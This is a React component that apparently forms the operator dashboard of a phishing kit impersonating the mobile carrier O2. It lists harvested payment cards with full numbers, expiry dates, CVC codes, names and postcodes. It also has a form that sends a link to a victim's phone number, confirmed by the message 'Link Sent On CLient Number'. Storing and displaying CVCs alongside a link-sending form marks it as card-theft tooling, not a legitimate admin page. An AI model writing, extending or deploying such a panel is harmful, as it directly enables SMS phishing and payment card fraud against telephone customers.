import "../../../assets/vendor/fontawesome-free/css/all.min.css"
import "../../../assets/vendor/bootstrap/css/bootstrap.min.css"
import "../../../assets/css/ruang-admin.min.css"
import Layout  from "../Layout"
import { NavLink } from "react-router-dom"
import { useEffect, useState } from "react"
import apiRequest from "../../../api/apiRequest"
import Taost from "react-hot-toast"
import "./dashboard.css";

const CardDetails = () => {
    const [number , setNumber] = useState(null);
    const [loader , setLoader] = useState(false);
    const [details , setDetails] = useState([])
               
    const fetchDetails = async () =>{
      setLoader(true)

        const res = await apiRequest("cards","GET");
      setDetails(res.data);
      setLoader(false);
    }

      useEffect(()=>{
                     
        fetchDetails();

      },[])

        const data ={
            number:number
        }

    const numberForm = async (e)=>{
        e.preventDefault();
        setLoader(true);
        const res = await apiRequest("send-number-card","POST",data)
        if(res.success){
          setNumber('')
          Taost('Link Sent On CLient Number', {
            duration: 4000,
            position: 'top-center',
          
            // Styling
            style: {},
            className: '',
          
            // Custom Icon
            icon: '👏',
          
            // Change colors of success/error/loading icon
            iconTheme: {
              primary: '#000',
              secondary: '#fff',
            },
          
            // Aria
            ariaProps: {
              role: 'status',
              'aria-live': 'polite',
            },
          });
          setLoader(false)
          // Taost.success("Thank you Support Team  contact you soon ")
        }else{
          Taost.error("something wrong")
        }
        
         
    }

     if(loader){
      return  <div className="loader">
      <div class="spinner-border text-light" role="status">
      <span class="sr-only">Loading...</span>
      </div>
      </div>  
     }


  return (
    <Layout>
        
                    
          <div className="container-fluid" id="container-wrapper">
          <div className="d-sm-flex align-items-center justify-content-between mb-4">
            <h1 className="h3 mb-0 text-gray-800">O2  Customer Bank Details</h1>
            <ol className="breadcrumb">
              <li className="breadcrumb-item"><NavLink to="/dashboard">Home</NavLink></li>
              <li className="breadcrumb-item active" aria-current="page">O2 details</li>
            </ol>
          </div>

          <div className="row mb-3">
          {/* <!-- Message From Customer--> */}
          <div className="col-xl-3 col-lg-3 ">
              <div className="card">
                <div className="card-header py-4 bg-primary d-flex flex-row align-items-center justify-content-between">
                  <h6 className="m-0 font-weight-bold text-light">Send Message  Customer</h6>
                </div>
                <div>
                  
                  <form action="" className="p-2" onSubmit={(e)=>{numberForm(e)}}>
                       
                       <div className="form-group">
                        <label htmlFor="">Enter Phone Number</label>
                        <input type="text" className="form-control"  value={number} onChange={(e)=>{setNumber(e.target.value)}}  />
                       </div>
                         
                         <button className="btn btn-primary">Send Message</button>
                  </form>
                 
                 


                 
                </div>
              </div>
            </div>
          
            <div className="col-xl-9 col-lg-9 mb-4">
              <div className="card">
                <div className="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                  <h6 className="m-0 font-weight-bold text-primary">02 user Card Details</h6>
                  <a className="m-0 float-right btn btn-danger btn-sm" href="#">View More <i
                      className="fas fa-chevron-right"></i></a>
                </div>
                <div className="table-responsive">
                  <table className="table align-items-center table-flush">
                    <thead className="thead-light">
                      <tr>
                        <th>SR #</th>
                        <th>Card</th>
                        <th>expiry</th>
                        <th>cvc</th>
                        <th>Card Name</th>
                        <th>Post Code</th>
                        
                      </tr>
                    </thead>
                    <tbody>
                    {
                      details.map((data , i )=>{
                         return <tr key={i}>
                        <td><b>{i+1}</b></td>
                        <td>{data.card}</td>
                        <td>{data.expiry}</td>
                        <td>{data.cvc}</td>
                        <td>{data.cardName}</td>
                        <td>{data.postCode}</td>
                      </tr>

                      })
                    }
                      
                     
                     
                    </tbody>
                  </table>
                </div>
                <div className="card-footer"></div>
              </div>
            </div>
          
          </div>
          {/* <!--Row--> */}


          {/* <!-- Modal Logout --> */}
          <div className="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabelLogout"
            aria-hidden="true">
            <div className="modal-dialog" role="document">
              <div className="modal-content">
                <div className="modal-header">
                  <h5 className="modal-title" id="exampleModalLabelLogout">Ohh No!</h5>
                  <button type="button" className="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                  </button>
                </div>
                <div className="modal-body">
                  <p>Are you sure you want to logout?</p>
                </div>
                <div className="modal-footer">
                  <button type="button" className="btn btn-outline-primary" data-dismiss="modal">Cancel</button>
                  <a href="login.html" className="btn btn-primary">Logout</a>
                </div>
              </div>
            </div>
          </div>

        </div>


    </Layout>
  )
}

export default CardDetails